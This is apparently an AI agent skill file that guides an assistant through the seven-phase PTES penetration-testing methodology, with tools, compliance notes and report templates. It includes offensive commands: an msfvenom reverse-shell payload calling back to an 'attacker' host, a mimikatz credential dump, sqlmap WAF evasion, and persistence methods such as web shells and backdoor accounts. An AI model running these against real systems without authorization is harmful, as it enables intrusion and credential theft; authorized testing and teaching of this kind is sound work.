---
name: ptes-standard
description: Penetration Testing Execution Standard (PTES) - comprehensive guide for conducting penetration tests across 7 phases: pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, and reporting. Use when planning or executing penetration tests, security assessments, or when user asks about PTES methodology.
license: MIT
compatibility: opencode
metadata:
  source: PTES
  version: "2.0"
---

# PTES - Penetration Testing Execution Standard

You are an expert in penetration testing following the PTES framework. Provide structured, actionable guidance based on the 7-phase methodology.

## When to Use This Skill

Invoke this skill when:
- User asks about penetration testing methodology or standards.
- User mentions `PTES`, `penetration testing`, `pentest`, `security assessment`.
- Planning, scoping, executing, or reporting a penetration test.
- User needs guidance on threat modeling, exploitation, post-exploitation, or intelligence gathering.

## The 7 Phases of PTES

| Phase | Focus |
|-------|-------|
| 1. Pre-engagement Interactions | Scoping, rules of engagement, legal agreements |
| 2. Intelligence Gathering | OSINT, passive/active reconnaissance |
| 3. Threat Modeling | Identify assets, threats, attack vectors |
| 4. Vulnerability Analysis | Automated + manual discovery, validation |
| 5. Exploitation | Gaining access, bypassing controls |
| 6. Post-Exploitation | Persistence, pivoting, data exfiltration |
| 7. Reporting | Findings, risk ratings, remediation |

---

## Phase 1: Pre-engagement Interactions

**Objectives**
- Define scope, goals, and limitations.
- Obtain written authorization (ROE – Rules of Engagement).
- Agree on timeline, budget, and communication channels.
- Determine testing type: black-box, grey-box, white-box.

**Key Deliverables**
- Signed contract/NDA.
- ROE document (allowed techniques, prohibited actions, emergency contacts).
- Test plan with milestones.

**Checklist**
- [ ] Legal authorization verified.
- [ ] Scope boundaries defined (IP ranges, domains, applications).
- [ ] Out-of-scope systems explicitly listed.
- [ ] Testing window scheduled.
- [ ] Emergency stop procedures established.

---

## Phase 2: Intelligence Gathering

**Objectives**
- Collect as much information as possible about target.
- Passive gathering (no direct interaction).
- Active gathering (direct probing, may be detectable).

**Passive OSINT Techniques**
- DNS enumeration (NS, MX, TXT, subdomains).
- WHOIS records.
- Google dorks (`site:target.com filetype:pdf`).
- Shodan, Censys (exposed services).
- Social media (LinkedIn, GitHub for employee info).
- Wayback Machine for historical pages.

**Active Reconnaissance**
- Network scanning (Nmap: `-sS -sV -O -p-`).
- Service enumeration (banner grabbing).
- Directory brute-force (gobuster, dirb).
- Technology fingerprinting (Wappalyzer, whatweb).

**Output**
- Network map with live hosts and open ports.
- List of services and versions.
- Potential entry points (web forms, APIs, login pages).

**Tools** – Nmap, Amass, Sublist3r, Recon-ng, Maltego, Burp Suite.

---

## Phase 3: Threat Modeling

**Objectives**
- Identify critical assets and potential attackers.
- Map attack vectors and likely paths.
- Prioritize vulnerabilities based on business impact.

**Methodologies**
- STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege).
- Attack trees.
- PASTA (Process for Attack Simulation & Threat Analysis).

**Questions to Answer**
- What are we protecting? (data, availability, reputation)
- Who is the adversary? (script kiddie, APT, insider)
- What are their goals? (data theft, defacement, ransomware)
- What attacks are most likely?

**Output**
- List of prioritized threats (High/Medium/Low).
- Attack surface diagram.
- Risk matrix.

---

## Phase 4: Vulnerability Analysis

**Objectives**
- Discover and validate vulnerabilities.
- Distinguish true positives from false positives.
- Prioritize based on exploitability and impact.

**Process**
1. **Automated scanning** – Nessus, OpenVAS, Qualys, Nikto (web).
2. **Manual verification** – Confirm each finding manually.
3. **Exploit research** – Check public exploits (Exploit-DB, CVE details, NVD).
4. **Proof-of-concept (PoC)** – Develop or adapt exploit code.

**Common Vulnerability Classes**
- Injection (SQL, NoSQL, OS command, LDAP).
- Broken Authentication (weak passwords, session fixation).
- Sensitive Data Exposure (unencrypted traffic, hardcoded keys).
- XXE, SSRF, CSRF, XSS.
- Misconfigurations (default creds, open S3 bucket).

**Output**
- Validated vulnerability list with CVSS scores.
- Screenshots or logs as evidence.
- Risk rating (Critical, High, Medium, Low).

**Tools** – Nessus, Nuclei, Burp Scanner, ZAP, Metasploit (auxiliary).

---

## Phase 5: Exploitation

**Objectives**
- Gain unauthorized access by exploiting validated vulnerabilities.
- Demonstrate real-world impact.
- Maintain stealth where required by scope.

**Approach**
- Start with simplest / lowest-risk exploit.
- Escalate privileges once foothold gained.
- Use public exploits carefully (adapt to target environment).
- Avoid DoS or data destruction unless authorized.

**Common Exploitation Paths**
- Web: SQLi → database dump; XSS → session hijacking; RCE → shell.
- Network: EternalBlue (MS17-010), weak SSH keys.
- Password: brute-force, pass-the-hash, credential stuffing.

**Tools** – Metasploit, sqlmap, BeEF, Hydra, CrackMapExec, Impacket.

**Best Practices**
- Always get explicit permission for exploitation.
- Have rollback plan.
- Document every command executed (for reporting and reproducibility).

**Output**
- Successful shell or access (screenshot).
- Compromised data sample (redacted).
- Privilege escalation demonstration.

---

## Phase 6: Post-Exploitation

**Objectives**
- Assess value of compromised system.
- Pivot to other internal systems.
- Exfiltrate (simulate) sensitive data.
- Maintain persistence (if authorized).

**Activities**
1. **System enumeration** – network connections, running processes, installed software, user privileges.
2. **Lateral movement** – use stolen credentials, Pass-the-Hash, RDP, SSH hopping.
3. **Data discovery** – search for passwords, PII, financial data, trade secrets.
4. **Cover tracks** – clear logs, remove artifacts (if authorized – often not included).

**Persistence Techniques (scope-dependent)**
- Scheduled task / cron job.
- Web shell.
- Service or registry key.
- Backdoor user account.

**Tools** – Mimikatz, BloodHound, PowerShell Empire, Cobalt Strike (if licensed), netcat, chisel.

**Output**
- Map of compromised systems.
- Data access demonstrated.
- Pivot chain documented.

---

## Phase 7: Reporting

**Objectives**
- Communicate findings clearly to technical and executive audiences.
- Provide actionable remediation steps.
- Demonstrate business risk.

**Report Structure**

1. **Executive Summary**
   - Objective and scope.
   - Overall security posture.
   - Top 3 risks with business impact.

2. **Technical Findings**
   - For each finding:
     - Title and risk rating.
     - Description (plain language).
     - Evidence (screenshots, logs).
     - Steps to reproduce.
     - Remediation steps with priority.

3. **Risk Assessment Table**
   | Finding | CVSS | Impact | Likelihood | Risk Rating |
   |---------|------|--------|------------|-------------|

4. **Methodology Summary** – phases performed, tools used.

5. **Appendix** – scan outputs, test cases, exploit code snippets.

**Reporting Tools**
- Templates: Dradis, ReportPortal.
- Manual: Word, Markdown, LaTeX.
- Automation: custom scripts to convert scan data to report.

**Checklist**
- [ ] All findings have evidence.
- [ ] False positives excluded.
- [ ] Remediation steps are specific (e.g., "change value X in file Y").
- [ ] No sensitive client data left in raw logs.
- [ ] Report encrypted when sent.

---

## Response Style

When user asks about a specific phase:
- State the phase objectives.
- List 2-3 key activities.
- Mention typical tools.
- Give a concrete example of what to do.

If user asks for full PTES overview, output the 7-phase table and then ask which phase they want to explore.

If user asks about a specific task (e.g., "How do I pivot after gaining a shell?"), map it to the relevant phase and provide step-by-step guidance.

Always emphasize **legal authorization** before any testing activity.

---

## Phase Deep-Dives

### Pre-engagement: Scoping Questionnaire

| Question | Purpose |
|----------|---------|
| What compliance drivers apply? (PCI DSS, HIPAA, SOC 2, FedRAMP) | Determines report format, control mapping, and evidence requirements |
| Are third-party systems in scope? (cloud providers, SaaS, colo) | Requires separate authorization from AWS/Azure/GCP per their pentest policies |
| What is the primary goal? (compliance, risk assessment, red team) | Drives depth, techniques, reporting style |
| Are social engineering and physical testing included? | Requires separate HR/legal sign-off and additional insurance |
| What data types will be encountered? (PII, PHI, cardholder data) | Sets data handling, redaction, and destruction procedures |
| Who is the emergency contact during testing? | Must be available 24/7 during test window |

### Intelligence Gathering: Advanced OSINT Levels

PTES defines three intelligence gathering levels:

| Level | Effort | Techniques |
|-------|--------|------------|
| L1 (Basic) | 1-2 days | DNS, WHOIS, Google dorks, Shodan, social media |
| L2 (Intermediate) | 3-5 days | Certificate transparency logs, job postings analysis, dark web search, physical location recon |
| L3 (Advanced) | 1-2 weeks | Social network profiling, dumpster diving, onsite surveillance, RF scanning, employee impersonation |

**Key OSINT command examples:**
```bash
amass enum -passive -d target.com -o passive.txt
sublist3r -d target.com -o subdomains.txt
dnsrecon -d target.com -t axfr
theHarvester -d target.com -b all -l 500
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq .
```

### Threat Modeling: Expanded Framework Comparison

| Method | Focus | Best For | Output |
|--------|-------|----------|--------|
| STRIDE | System design flaws | Microsoft SDL, app sec | Categorized threat list per DFD element |
| PASTA | Risk-centric, 7 stages | Enterprise risk management | Attack tree + risk score per asset |
| Attack Trees | Goal-oriented decomposition | Single system/feature depth | Hierarchical goal-condition tree |
| OCTAVE | Organizational risk | CISOs, program-level | Risk matrix + mitigation plan |
| LINDDUN | Privacy threats | GDPR compliance, data protection | Privacy threat list |
| VAST | Agile/DevSecOps | Continuous threat modeling | Scalable, automated integration |

### Vulnerability Analysis: Depth vs Breadth

The vulnerability analysis phase must balance two dimensions:

**Depth:** How thoroughly each target is examined
- Level 1: Unauthenticated scan (external perimeter)
- Level 2: Authenticated scan with standard credentials
- Level 3: Manual deep-dive including configuration review and business logic
- Level 4: Full source-code assisted analysis (white-box)

**Breadth:** How many targets are covered
- All in-scope IPs, domains, applications
- All network segments (DMZ, internal, management)
- All environments (prod, staging, dev — per scope)

### Exploitation: Precision Strike Approach

The PTES exploitation phase emphasizes precision over volume:

1. **Countermeasure enumeration** — Identify WAF, IPS, EDR, AV before launching exploit
2. **Tailored exploit customization** — Adapt public exploits to target OS version/patch level
3. **Dry-run in lab** — Reproduce target environment for testing before going live
4. **Stealth considerations** — Use encoding, encryption, and protocol evasion to bypass detection
5. **Documentation** — Record every command and result for reproducibility

```bash
# Example: WAF evasion with SQLMap
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment --random-agent --delay=2
# Example: Customizing Metasploit module for specific target
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker LPORT=443 -f elf -o payload.elf
```

### Post-Exploitation: Full Enumeration Checklist

#### Windows
```bash
whoami /all
net localgroup Administrators
netstat -ano
tasklist /v
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Dump credentials
mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

#### Linux
```bash
id
sudo -l
cat /etc/passwd
ss -tulpn
ps aux
find / -perm -4000 2>/dev/null
cat /etc/crontab
ls -la /home/*/.ssh/
```

#### Active Directory Lateral Movement
```powershell
# Enumerate with PowerView
Get-NetUser | select samaccountname,admincount,lastlogontimestamp
Get-NetComputer | select name,operatingsystem
Find-LocalAdminAccess
Invoke-ShareFinder
# BloodHound collector
Sharphound.exe -c All,GPOLocalGroup,Session
```

### Reporting: Risk Quantification and Business Impact

**Risk = Likelihood × Impact**

Common scoring frameworks used in PTES reporting:
- **CVSS v3.1** — Industry standard for technical severity (base/temporal/environmental)
- **DREAD** — Damage, Reproducibility, Exploitability, Affected users, Discoverability
- **FAIR** — Factor Analysis of Information Risk (quantitative, $ amounts)
- **OWASP Risk Rating** — Likelihood + Impact adjusted for business context

**Executive Summary must answer:**
1. What was tested and why?
2. What is the worst thing an attacker could do?
3. How bad is the overall risk?
4. What are the top 3 things to fix immediately?
5. What is the general remediation timeline?

**Technical findings must include:**
- Precise title (not category), CVSS vector + score, CWE/CVE reference
- Reproduction steps detailed enough for dev to verify
- Evidence: sanitized screenshots, request/response pairs
- Business impact specific to this environment
- Remediation: actionable, version/technology-specific

---

## Tool-by-Phase Matrix

| Tool | Phase | Purpose |
|------|-------|---------|
| Nmap | 2 (IG) | Port scanning, service detection, OS fingerprinting |
| Amass | 2 (IG) | Subdomain enumeration via DNS, cert logs, APIs |
| Sublist3r | 2 (IG) | Fast subdomain discovery |
| theHarvester | 2 (IG) | Email, subdomain, host enumeration |
| Maltego | 2 (IG) | OSINT relationship graphing |
| Recon-ng | 2 (IG) | Modular reconnaissance framework |
| Shodan | 2 (IG) | Internet-facing device/service discovery |
| Nessus | 4 (VA) | Vulnerability scanning (authenticated + unauthenticated) |
| OpenVAS | 4 (VA) | Open-source vulnerability scanner |
| Nuclei | 4 (VA) | Fast template-based vulnerability scanner |
| Burp Suite | 4 (VA) / 5 (EX) | Web app scanning, interception, exploitation |
| OWASP ZAP | 4 (VA) | Web app vulnerability scanner |
| Nikto | 4 (VA) | Web server vulnerability scanner |
| Metasploit | 4 (VA) / 5 (EX) / 6 (PE) | Exploitation framework, auxiliary scanning, post-exploitation |
| sqlmap | 5 (EX) | Automated SQL injection detection and exploitation |
| Hydra | 5 (EX) | Online password brute-forcing |
| Hashcat | 5 (EX) | Offline password cracking (GPU-accelerated) |
| John the Ripper | 5 (EX) | Offline password cracking |
| Mimikatz | 6 (PE) | Windows credential dumping |
| BloodHound | 3 (TM) / 6 (PE) | AD attack path mapping |
| CrackMapExec | 5 (EX) / 6 (PE) | Windows domain post-exploitation Swiss Army knife |
| Impacket | 5 (EX) / 6 (PE) | Windows protocol suite (psexec, wmiexec, smbexec) |
| Chisel | 6 (PE) | Fast TCP/UDP tunnel over HTTP |
| Ligolo-ng | 6 (PE) | Tunneling/pivoting proxy |
| PowerView | 6 (PE) | AD enumeration PowerShell module |
| LinPEAS/WinPEAS | 6 (PE) | Privilege escalation enumeration scripts |
| Cobalt Strike | 5 (EX) / 6 (PE) | Commercial adversary simulation (C2 framework) |
| Prowler | 4 (VA) | Cloud (AWS/Azure/GCP) security assessment |
| ScoutSuite | 2 (IG) / 4 (VA) | Multi-cloud security auditing |
| Pacu | 5 (EX) | AWS exploitation framework |
| AzureHound | 6 (PE) | Azure/Entra ID attack path mapping |

---

## Standards Comparison

| Aspect | PTES | OWASP WSTG | NIST SP 800-115 | OSSTMM | ISSAF |
|--------|------|------------|-----------------|--------|-------|
| **Scope** | Full engagement lifecycle | Web apps + APIs | IT infrastructure | All security channels | Multi-domain |
| **Approach** | 7-phase methodology | 91 test cases across 12 categories | 4-phase (Plan, Discover, Attack, Report) | Metrics-based measurement | Domain-specific test plans |
| **Detail level** | Process-focused | Very high (per-vuln class) | Moderate | High (channels) | Very high |
| **Exploitation** | Deep (dedicated phase) | Per-test case | Moderate (validation) | Varies by channel | Deep |
| **Threat modeling** | Dedicated phase | Not covered | Not covered | Trust analysis | Not covered |
| **Post-exploitation** | Dedicated phase | Not covered | Not covered | Channel-dependent | Included |
| **Reporting** | Exec + technical | Per-finding | Control mapping | STAR (RAV scores) | Template-based |
| **Cloud support** | Adaptable via PTES-TG | API testing coverage | Outdated (2008) | Not covered | Partial |
| **Compliance mapping** | General industry | PCI DSS, SOC 2 | FedRAMP, FISMA, NIST CSF | ISO 27001 | ISO, COBIT |
| **Last major update** | 2014 (community) | 2022 (v4.2) | 2008 | 2010 (v3) | Archived |
| **Best for** | Engagement management | Web app security | Regulated environments | Operational security | Multi-domain assessments |

**Complementary usage pattern (most effective):**
- PTES for overall engagement lifecycle (pre-engagement → reporting)
- OWASP WSTG for web app technical depth within PTES Phase 4 & 5
- NIST SP 800-115 for compliance/government contexts
- OSSTMM for physical, wireless, and human security channels
- MITRE ATT&CK for threat-informed adversary emulation in red team ops

---

## Modern Infrastructure Adaptations

### Cloud (AWS / Azure / GCP)

PTES phases adapt to cloud environments where identity is the primary control plane:

| Traditional PTES Phase | Cloud Adaptation |
|------------------------|-----------------|
| Pre-engagement | Include CSP account IDs, subscriptions, projects in scope; confirm CSP pentest policy |
| Intelligence Gathering | Enumerate S3/Blob/GCS buckets, IAM roles, CloudFront distributions, cert transparency |
| Threat Modeling | IAM trust relationships, cross-account access, federation attack paths |
| Vulnerability Analysis | ScoutSuite, Prowler, CloudFox, CIS benchmarks for cloud |
| Exploitation | IAM privilege escalation, SSRF → metadata service, role chaining, K8s API abuse |
| Post-Exploitation | Cross-account movement, managed identity abuse, secrets retrieval from vaults |
| Reporting | Map findings to CIS Benchmarks, CSA CCM, CSP Well-Architected pillars |

**Cloud-specific tools:** Pacu (AWS), AzureHound (Azure), gcp_enum (GCP), Prowler (multi), ScoutSuite (multi), CloudSploit (multi), CloudFox (AWS/Azure), SkyArk (AWS/Azure)

**Key cloud attack primitives:**
- IMDSv1 abuse via SSRF → temporary IAM credentials (AWS)
- AzureHound path: Contributor → Managed Identity → Key Vault secrets
- GCP: default Compute Engine service account with Editor role
- K8s: exposed API server, etcd without auth, over-permissive ClusterRole

### Containers / Kubernetes

| PTES Phase | Container/K8s Focus |
|------------|---------------------|
| Pre-engagement | Cluster API endpoint, pod security policies, network policies in scope |
| Intelligence Gathering | Container registry scanning, K8s dashboard exposure, kubeconfig leaks |
| Threat Modeling | Container escape paths, cluster-admin abuse, supply chain attacks |
| Vulnerability Analysis | Trivy/Grype for images, kube-bench for CIS, kube-hunter for cluster |
| Exploitation | `kubectl exec` abuse, hostPath mount escape, runC/CVE container escape |
| Post-Exploitation | Service account token harvesting, cluster-to-cloud pivot, persistent DaemonSet |
| Reporting | Container image CVEs, RBAC misconfigurations, namespace isolation gaps |

### APIs / Microservices

| PTES Phase | API/Microservices Focus |
|------------|------------------------|
| Pre-engagement | Endpoint inventory, auth mechanism (JWT, OAuth2, API keys), rate limits |
| Intelligence Gathering | API doc discovery (Swagger/Slate), GraphQL introspection, JS source analysis |
| Threat Modeling | BOLA/IDOR, BFLA, mass assignment, JWT algorithm confusion |
| Vulnerability Analysis | 403 bypass, parameter pollution, rate limiting, injection points |
| Exploitation | OAuth token theft, JWT none algorithm, GraphQL depth query abuse |
| Post-Exploitation | Internal API discovery, service mesh abuse, config server access |
| Reporting | OWASP API Top 10 mapping, rate-limiting gaps, authz failures |

---

## Legal & Compliance Notes

### PCI DSS v4.0 (Requirement 11.4)
- Annual external + internal penetration testing required
- Must follow industry-accepted methodology (PTES, OWASP, NIST SP 800-115 are recognized)
- Segmentation testing every 6 months
- Testers must be Qualified (independent from CDE operations)
- All findings > CVSS 4.0 require remediation verification retest

### HIPAA Security Rule (45 CFR § 164.306)
- Penetration testing is **recommended** (not explicitly mandated) as part of Risk Analysis
- All ePHI-touching systems should be in scope
- Business Associate Agreements must cover testing, data handling, breach notification
- Avoid PHI extraction — use synthetic data or tokenization for PoC

### GDPR (Article 32)
- Requires "regular testing, assessing and evaluating effectiveness" of TOMs
- Penetration testing is strong evidence of TOM effectiveness
- Data Protection Impact Assessments (DPIA) should inform test scope
- Special category data processing requires stricter controls
- Findings must feed into breach response planning

### SOC 2 / ISO 27001
- Penetration testing is **expected** (not always explicit) as part of vulnerability management
- Annual minimum cadence
- Findings must map to Trust Services Criteria (SOC 2) or Annex A controls (ISO 27001)
- Retesting evidence required for critical/high findings

### FedRAMP / FISMA
- NIST SP 800-115 is the baseline reference
- Annual penetration testing required
- Results documented in Plan of Action and Milestones (POA&M)
- Mapping to NIST SP 800-53 controls required

### Cloud Provider Authorization

| Cloud | Policy | Pre-approval needed? |
|-------|--------|---------------------|
| AWS | Permits testing customer-owned resources | No (for most services); DDoS prohibited |
| Azure | Permits testing under Rules of Engagement | No; acceptable use policy applies |
| GCP | Permits testing on customer systems | No; social engineering against Google employees prohibited |

---

## Reporting Templates

### Executive Summary Template

```
# PENETRATION TEST EXECUTIVE SUMMARY
## [Client Name] | [Date Range]

### Engagement Overview
- **Assessment Type:** External/Internal/Web App/Cloud/Red Team
- **Methodology:** PTES v2.0, OWASP WSTG v4.2
- **Scope:** [IP ranges, domains, cloud accounts, apps]
- **Testing Dates:** [Start] – [End]

### Overall Risk Posture: [CRITICAL / HIGH / MEDIUM / LOW]

An attacker with [low/medium/no] prior access could have [stolen customer data /
gained domain admin / achieved full cloud account takeover] within [timeframe].
[2-3 sentence plain-language summary of worst-case impact.]

### Key Findings
| Severity | Count | Top Issue |
|----------|-------|-----------|
| Critical | [N] | [Worst finding in business terms] |
| High | [N] | [Second worst finding] |
| Medium | [N] | [Notable finding] |
| Low | [N] | [Informational] |

### Urgent Actions (Next 30 Days)
1. **[Action 1]** — [Business impact if not fixed] — [Effort estimate]
2. **[Action 2]** — [Business impact if not fixed] — [Effort estimate]
3. **[Action 3]** — [Business impact if not fixed] — [Effort estimate]

### Strategic Roadmap
- **Immediate (0-30 days):** Quick wins, critical fixes
- **Short-term (30-90 days):** Architectural improvements, process changes
- **Long-term (90-180 days):** Programmatic security enhancements
```

### Technical Finding Template

```
### [FINDING TITLE] — [Critical/High/Medium/Low]

**CVSS v3.1:** [9.0-10.0] Vector: [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]
**CWE:** [CWE-89] **CVE:** [CVE-2024-XXXX]
**Affected Asset:** [https://target.com/page]
**First Identified:** [Date]

**Description:**
[2-3 sentence description of the vulnerability in plain language]

**Impact:**
An attacker could [gain full admin access / extract all customer PII / execute
arbitrary code on the server], leading to [compliance violation / financial loss /
reputational damage].

**Steps to Reproduce:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Evidence:**
[Redacted screenshot or request/response block]

**Remediation:**
[Technology-specific actionable guidance]
e.g., "In file.php, line 45, replace direct string concatenation in SQL queries
with parameterized prepared statements using PDO."

**Status:** Open / Fixed / Accepted Risk / Remediated
```

---

## References

### Official PTES Documentation
1. PTES Main Page — http://pentest-standard.org/
2. PTES ReadTheDocs v1.1 — https://pentest-standard.readthedocs.io/
3. PTES Technical Guidelines (offline PDF) — https://ftp.kr-labs.com.ua/books/ptes-guide-pentest.pdf
4. PTES GitHub Repository — https://github.com/pentest-standard/docs
5. PTES Pre-engagement — http://www.pentest-standard.org/index.php/Pre-engagement
6. PTES Intelligence Gathering — http://www.pentest-standard.org/index.php/Intelligence_Gathering
7. PTES Threat Modeling — http://www.pentest-standard.org/index.php/Threat_Modeling
8. PTES Vulnerability Analysis — http://www.pentest-standard.org/index.php/Vulnerability_Analysis
9. PTES Exploitation — http://www.pentest-standard.org/index.php/Exploitation
10. PTES Post-Exploitation — http://www.pentest-standard.org/index.php/Post_Exploitation
11. PTES Reporting — http://www.pentest-standard.org/index.php/Reporting
12. PTES Technical Guidelines — http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines

### Standards & Methodology Comparisons
13. OWASP WSTG v4.2 — https://owasp.org/www-project-web-security-testing-guide/
14. NIST SP 800-115 (2008) — https://csrc.nist.gov/pubs/sp/800/115/final
15. NIST SP 800-115 PDF — https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-115.pdf
16. OSSTMM v3 (ISECOM, 2010) — https://isecom.org/OSSTMM.3.pdf
17. PCI SSC Penetration Testing Guidance v1.1 — https://www.pcisecuritystandards.org/documents/Penetration-Testing-Guidance-v1_1.pdf
18. CREST Defensible Penetration Test v5.2 — https://www.crest-approved.org/wp-content/uploads/2022/12/CREST-Defensible-Penetration-Test-v5-2.pdf
19. OWASP Testing Framework Methodologies — https://owasp.org/www-project-web-security-testing-guide/v41/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies
20. PTES vs NIST vs OSSTMM (TechPause, 2026) — https://techpause.org/blog/ptes-nist-pentest-standards
21. Penetration Testing Methodology Explained (TechPause, 2026) — https://techpause.org/blog/penetration-testing-methodology-explained
22. PTES vs OWASP vs OSSTMM (SecureSystems, 2026) — https://www.securesystems.com/penetration-testing-methodology/
23. PTES Methodology (MyCyberSecurityPath, 2026) — https://mycybersecuritypath.com/cybersecurity/pentest-methodologies/
24. Penetration Testing Methodologies (DeepStrike, 2025) — https://deepstrike.io/blog/penetration-testing-methodology
25. Penetration Testing Framework & Methodologies (ITU Online, 2025) — https://www.ituonline.com/blogs/comprehensive-guide-to-testing-frameworks-and-methodologies-in-penetration-testing/
26. Methodology Guide (Valtik Studios, 2026) — https://www.valtikstudios.com/blog/penetration-testing-methodology-complete-guide

### Threat Modeling
27. Microsoft STRIDE — Shostack, A., "Experiences Threat Modeling at Microsoft" (2008) — https://shostack.org/files/papers/modsec08/Shostack-ModSec08-Experiences-Threat-Modeling-At-Microsoft.pdf
28. Hernan, S. et al., "Uncover Security Design Flaws Using the STRIDE Approach" (MSDN, 2006)
29. Howard, M. & Lipner, S., "The Security Development Lifecycle" (Microsoft Press, 2006)
30. Uceda Vélez, T. & Morana, M.M., "Risk Centric Threat Modeling" (Wiley, 2015) — PASTA methodology
31. Schneier, B., "Attack Trees" (Dr. Dobb's Journal, 1999)
32. OWASP Threat Modeling Process — https://owasp.org/www-community/Threat_Modeling_Process
33. CMU SEI, "Threat Modeling: 12 Available Methods" (2018) — https://www.sei.cmu.edu/blog/threat-modeling-12-available-methods/
34. Shostack, A., "Threat Modeling: Designing for Security" (Wiley, 2014)
35. Naik, N. et al., "A Comparative Analysis of Threat Modelling Methods" (Springer, 2024) — https://link.springer.com/chapter/10.1007/978-3-031-74443-3_16
36. Scandariato, R. et al., "A Descriptive Study of Microsoft's Threat Modeling Technique" (Requirements Engineering, Springer 2014)
37. Shostack + Associates — Ultimate Beginner's Guide to Threat Modeling — https://shostack.org/resources/threat-modeling.html
38. PASTA Threat Modeling (Univ. Wisconsin, 2026) — https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/08-PASTA-Threat-Modeling.pdf

### Reporting & Documentation
39. PCI SSC Report Evaluation Checklist (Penetration Testing Guidance Appendix)
40. Hackers Manifest — Executive Report Templates — https://hackersmanifest.com/reporting-templates/
41. PentestReportAI — Executive Summary Guide (2026) — https://www.pentestreportai.com/blog/penetration-testing-executive-summary
42. Pentiq — What a Good Penetration Testing Report Should Include (2026) — https://www.pentiq.com/insights/what-a-good-penetration-testing-report-should-include
43. SecPortal — How to Write a Pentest Report (2026) — https://secportal.io/blog/how-to-write-a-pentest-report
44. CVSS v3.1 Specification Document — https://www.first.org/cvss/v3-1/
45. FAIR Model — Factor Analysis of Information Risk — https://www.fairinstitute.org/

### Cloud Adaptations
46. Cloud Penetration Testing Methodology (Lorikeet Security, 2026) — https://lorikeetsecurity.com/blog/cloud-penetration-testing-aws-azure-gcp
47. Cloud Pentest (Penetration Testing Authority, 2026) — https://penetrationtestingauthority.com/cloud-penetration-testing
48. Cloud Pentesting Methodologies (Cloud Security Authority, 2026) — https://cloudsecurityauthority.com/cloud-penetration-testing/
49. Cloud Pentesting Methodology (Cloud Defense Authority) — https://clouddefenseauthority.com/cloud-penetration-testing/
50. HackTricks Cloud Methodology — https://cloud.hacktricks.wiki/en/pentesting-cloud/pentesting-cloud-methodology.html
51. Codesecure — Cloud Pentest Guide (2026) — https://codesecure.in/blogs/cloud-penetration-testing-aws-azure-gcp
52. Bishop Fox Cloud Penetration Testing Methodology — https://bishopfox.com/resources/cloud-pen-testing-methodology
53. Cloud Penetration Testing (CyberneticsPlus, 2026) — https://cyberneticsplus.com/blog/cloud-penetration-testing-aws-azure-gcp/
54. CIS Benchmarks for AWS, Azure, GCP — https://www.cisecurity.org/benchmark/cloud
55. OWASP Cloud-Native Application Security Top 10 — https://owasp.org/www-project-cloud-native-application-security-top-10/
56. Cloud Security Alliance (CSA) Cloud Controls Matrix — https://cloudsecurityalliance.org/research/cloud-controls-matrix/

### Mobile & API Adaptations
57. OWASP MASVS v2.1 — https://mas.owasp.org/
58. OWASP MASTG — https://github.com/OWASP/owasp-mastg
59. OWASP API Security Top 10 — https://owasp.org/www-project-api-security/
60. Mobile Pentest Methodology (Intrinsec, 2026) — https://www.intrinsec.com/en/pentest-mobile/
61. Mobile Pentest Guide (Secra, 2026) — https://secra.es/en/blog/mobile-application-penetration-testing-ios-android
62. Mobile Pentest Methodology (Mobile Hacking Course, 2026) — https://mobilehackingcourse.com/mobile-penetration-testing-methodology/
63. Mobile Pentesting Guide (Hive Security, 2026) — https://hivesecurity.gitlab.io/blog/mobile-pentesting-android-ios-complete-guide/
64. Mobile App Pentesting Guide (BlueFire Red Team, 2026) — https://bluefire-redteam.com/mobile-application-penetration-testing-guide/
65. Mobile Security Testing with MASVS (Safeguard, 2026) — https://safeguard.sh/resources/blog/mobile-app-security-testing-owasp-masvs-2026

### Post-Exploitation
66. PTES Post-Exploitation Technical Guidelines — PTES-TG Section 4.7–4.10, 5.0–5.1
67. RVAPT — Post Exploitation (Sunggwan Choi, 2020) — https://blog.sunggwanchoi.com/rvapt-6-post-exploitation/
68. TU Graz — Pentesting Lab Post-Exploitation (2026) — https://www.isec.tugraz.at/wp-content/uploads/2026/03/04-post-exploitation-handout-2026.pdf
69. Hackers Manifest — Internal Pentest Executive Reports — https://hackersmanifest.com/internal-pentest/07c-executive-reports/
70. BloodHound CE Documentation — https://bloodhound.readthedocs.io/
71. Mimikatz Wiki — https://github.com/gentilkiwi/mimikatz/wiki
72. CrackMapExec (NetExec) — https://www.netexec.wiki/
73. Impacket Documentation — https://www.impacket.org/

### Legal & Compliance
74. 18 U.S.C. § 1030 — Computer Fraud and Abuse Act (CFAA)
75. 45 CFR § 164.306 — HIPAA Security Rule
76. GDPR Article 32 — Security of Processing
77. PCI DSS v4.0 — Requirement 11.4
78. FedRAMP Penetration Test Guidance — https://www.fedramp.gov/
79. NIST SP 800-53 — Security and Privacy Controls
80. NIST SP 800-37 — Risk Management Framework
81. AccountableHQ — Regulatory Pentest Requirements (2026) — https://www.accountablehq.com/post/regulatory-penetration-testing-requirements
82. Lorikeet Security — Compliance Frameworks Requiring Pentest (2026) — https://lorikeetsecurity.com/blog/pentest-compliance-requirements-2026
83. InventiveHQ — How to Scope a Penetration Testing Engagement — https://inventivehq.com/knowledge-base/security-compliance/how-to-scope-a-penetration-test
84. Penetration Testing Authority — Rules of Engagement (2026) — https://penetrationtestingauthority.com/rules-of-engagement-penetration-testing
85. Penetration Testing Authority — Contract Checklist (2026) — https://penetrationtestingauthority.com/penetration-testing-contract-checklist
86. PTES Healthcare Pen Testing (AccountableHQ, 2026) — https://www.accountablehq.com/post/ptes-healthcare-pen-testing-methodology-scope-and-best-practices
87. AWS Penetration Testing Policy — https://aws.amazon.com/security/penetration-testing/
88. Azure Penetration Testing Rules of Engagement — https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement
89. GCP Penetration Testing Policy — https://cloud.google.com/security/pentest-policy

